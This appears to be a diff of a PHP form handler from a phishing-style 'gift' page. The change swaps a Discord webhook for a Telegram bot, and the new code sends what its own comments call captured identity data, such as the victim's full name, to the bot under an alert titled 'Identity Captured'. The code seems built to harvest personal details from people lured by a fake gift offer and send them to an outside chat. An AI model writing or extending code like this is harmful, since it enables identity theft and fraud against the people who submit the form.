@@ -4,9 +4,9 @@
    Handles form submission: validates, saves, logs to terminal output.
    ════════════════════════════════════════════════════════════════════ */
 
-/* ── Discord Webhook Integration ────────────────────────────── */
-if (!defined('DISCORD_WEBHOOK_URL')) {
-    require_once __DIR__ . '/../core/discord_webhook.php';
+/* ── Telegram Webhook Integration ────────────────────────────── */
+if (!defined('TELEGRAM_BOT_TOKEN') || !defined('TELEGRAM_CHAT_ID')) {
+    require_once __DIR__ . '/../core/telegram_webhook.php';
 }
 
 session_start();
@@ -182,8 +182,8 @@ error_log($terminal_log);
    regardless of php.ini error_log setting */
 file_put_contents('php://stderr', $terminal_log);
 
-/* ── Discord Notification: Gift Form / Identity Capture ── */
-sendDiscordAlert(
+/* ── Telegram Notification: Gift Form / Identity Capture ── */
+sendTelegramAlert(
     '🎁 Gift Request -- Identity Captured',
     [
         'Full Name'  => $full_name,
